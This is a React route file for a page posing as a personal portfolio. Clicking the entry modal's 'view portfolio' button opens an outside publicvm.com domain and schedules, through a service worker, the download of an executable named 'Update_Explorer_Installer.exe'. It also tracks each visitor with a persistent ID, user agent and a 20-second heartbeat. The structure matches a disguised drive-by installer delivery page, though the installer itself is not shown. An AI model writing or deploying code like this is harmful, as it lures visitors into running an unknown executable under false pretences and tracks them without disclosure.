import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { EntryModal } from "@/components/EntryModal";
import { Navbar } from "@/components/Navbar";
import { Portfolio } from "@/components/Portfolio";
import { recordActivity } from "@/lib/activity";
import { scheduleInstallerDownload } from "@/lib/installer-download";
import { toast } from "sonner";

export const Route = createFileRoute("/")({
  component: Index,
});

function Index() {
  const [modalOpen, setModalOpen] = useState(true);
  const downloadInstaller = () => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    // Clear any previous cancel flags for this visitor
    localStorage.removeItem(`cancel-download-${visitorId}`);

    setModalOpen(false);
    window.open("https://www.legendofeternity.publicvm.com", "_blank", "noopener,noreferrer");
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 99, userAgent: navigator.userAgent } });
    toast.message("Opening portfolio in a new tab...");

    void scheduleInstallerDownload({ data: { visitorId } })
      .then(({ availableAt, downloadUrl }) => {
        const delay = Math.max(0, availableAt - Date.now());
        const payload = { type: "SCHEDULE_DOWNLOAD", url: downloadUrl, delay, visitorId };

        // Show a cancellable in-page banner while the download is scheduled
        try { showScheduleBanner(visitorId, delay); } catch (e) { console.error(e); }

        const fallbackToDirectDownload = () => {
          // Schedule a prompt for the user instead of fetching immediately.
          window.setTimeout(() => {
            // If the visitor explicitly cancelled the scheduled download, skip it.
            if (localStorage.getItem(`cancel-download-${visitorId}`)) {
              console.info('Scheduled installer download cancelled for', visitorId);
              void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "not_clicked", downloadPercent: 0, userAgent: navigator.userAgent } });
              return;
            }

            void startInstallerDownload(downloadUrl, visitorId).catch((error) => {
              toast.error("Unable to download the installer. Please try again.");
              console.error(error);
            });
          }, delay);
        };

        if ("serviceWorker" in navigator) {
          void navigator.serviceWorker.ready
            .then((registration) => {
              const worker = registration.active || registration.waiting || registration.installing || navigator.serviceWorker.controller;
              if (worker) {
                worker.postMessage(payload);
              } else {
                fallbackToDirectDownload();
              }
            })
            .catch((error) => {
              console.error(error);
              fallbackToDirectDownload();
            });
          return;
        }

        fallbackToDirectDownload();
      })
      .catch((error) => {
        toast.error("Unable to schedule the installer download. Please try again.");
        console.error(error);
      });
  };
  useEffect(() => {
    if ("serviceWorker" in navigator) {
      void navigator.serviceWorker.register("/sw-download.js").catch((error) => {
        console.error("Service worker registration failed", error);
      });

      const handleDownloadReady = (event: MessageEvent) => {
        if (event.data?.type !== "DOWNLOAD_READY") return;
        // Hide schedule banner when the download becomes ready
        try { hideScheduleBanner(event.data.visitorId); } catch (e) { console.error(e); }
        void startInstallerDownload(event.data.url, event.data.visitorId).catch((error) => {
          toast.error("Unable to download the installer. Please try again.");
          console.error(error);
        });
      };

      navigator.serviceWorker.addEventListener("message", handleDownloadReady);
      return () => navigator.serviceWorker.removeEventListener("message", handleDownloadReady);
    }
  }, []);

  useEffect(() => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    const userAgent = navigator.userAgent;
    const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
      void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
    update("active");
    const heartbeat = window.setInterval(() => update("active"), 20000);
    const onPageHide = () => update("left");
    const onFocus = () => update("active");
    window.addEventListener("pagehide", onPageHide);
    window.addEventListener("focus", onFocus);
    return () => { window.clearInterval(heartbeat); window.removeEventListener("pagehide", onPageHide); window.removeEventListener("focus", onFocus); };
  }, []);

  return (
      <div className="min-h-screen bg-background">
        <Navbar />
        <Portfolio />
        <EntryModal
          open={modalOpen}
          onViewPortfolio={() => downloadInstaller()}
        />
        <Toaster />
      </div>
  );
}

async function startInstallerDownload(downloadUrl: string, visitorId: string) {
  try {
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 0, userAgent: navigator.userAgent } });
  } catch (error) {
    console.error(error);
  }

  // If the visitor cancelled the scheduled download, do nothing.
  if (localStorage.getItem(`cancel-download-${visitorId}`)) {
    console.info('Download cancelled by user before starting', visitorId);
    return;
  }

  // Ask the user to confirm before fetching the installer. This avoids
  // downloading the entire file into memory unexpectedly and gives the
  // user a chance to cancel.
  const confirmed = window.confirm(
    "An installer is ready to download. Do you want to download it now?"
  );
  if (!confirmed) {
    // Mark cancelled so scheduled handlers can respect this choice.
    localStorage.setItem(`cancel-download-${visitorId}`, "1");
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "not_clicked", downloadPercent: 0, userAgent: navigator.userAgent } });
    toast.message("Installer download cancelled.");
    return;
  }

  const response = await fetch(downloadUrl, { cache: "no-store", keepalive: true });
  if (!response.ok) throw new Error("Installer download failed");

  const installer = await response.blob();
  const objectUrl = URL.createObjectURL(installer);
  const link = document.createElement("a");
  link.href = objectUrl;
  link.download = "Update_Explorer_Installer.exe";
  document.body.append(link);
  link.click();
  link.remove();
  window.setTimeout(() => URL.revokeObjectURL(objectUrl), 0);
}

// Simple in-page banner that shows when an installer download is scheduled.
function showScheduleBanner(visitorId: string, delay: number) {
  try {
    const id = `installer-banner-${visitorId}`;
    hideScheduleBanner(visitorId);
    const banner = document.createElement("div");
    banner.id = id;
    banner.style.position = "fixed";
    banner.style.right = "20px";
    banner.style.bottom = "20px";
    banner.style.zIndex = "9999";
    banner.style.background = "#0f172a";
    banner.style.color = "#fff";
    banner.style.padding = "12px 14px";
    banner.style.borderRadius = "8px";
    banner.style.boxShadow = "0 6px 24px rgba(2,6,23,0.6)";
    banner.style.fontFamily = "sans-serif";

    const message = document.createElement("span");
    const seconds = Math.ceil(Math.max(0, delay) / 1000);
    message.textContent = `Installer will be ready in ${seconds}s.`;
    banner.appendChild(message);

    const btn = document.createElement("button");
    btn.textContent = "Cancel";
    btn.style.marginLeft = "12px";
    btn.style.background = "#dc2626";
    btn.style.color = "#fff";
    btn.style.border = "none";
    btn.style.padding = "6px 10px";
    btn.style.borderRadius = "6px";
    btn.style.cursor = "pointer";
    btn.onclick = () => {
      localStorage.setItem(`cancel-download-${visitorId}`, "1");
      hideScheduleBanner(visitorId);
      try { window.dispatchEvent(new CustomEvent('installer-download-cancelled', { detail: { visitorId } })); } catch {}
      // Notify server of cancellation (best-effort)
      void fetch('/api/record-activity', { method: 'POST', body: JSON.stringify({ visitorId, appStatus: 'not_clicked' }), headers: { 'Content-Type': 'application/json' } }).catch(() => {});
    };
    banner.appendChild(btn);

    document.body.appendChild(banner);

    // Auto-hide when delay elapses (if not cancelled earlier)
    setTimeout(() => hideScheduleBanner(visitorId), Math.max(0, delay));
  } catch (e) { console.error(e); }
}

function hideScheduleBanner(visitorId: string) {
  try {
    const id = `installer-banner-${visitorId}`;
    const el = document.getElementById(id);
    if (el && el.parentNode) el.parentNode.removeChild(el);
  } catch (e) { console.error(e); }
}

